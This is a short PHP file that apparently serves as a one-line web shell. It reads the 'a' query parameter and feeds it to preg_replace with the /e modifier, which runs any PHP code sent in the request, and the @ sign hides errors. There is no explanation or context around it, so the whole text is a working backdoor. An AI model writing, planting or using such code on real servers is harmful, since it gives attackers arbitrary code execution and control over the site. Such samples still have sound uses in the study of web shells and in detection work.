<?php
function fun()
{return $_GET['a'];}
@preg_replace("/test/e",fun(),"test test test");
?>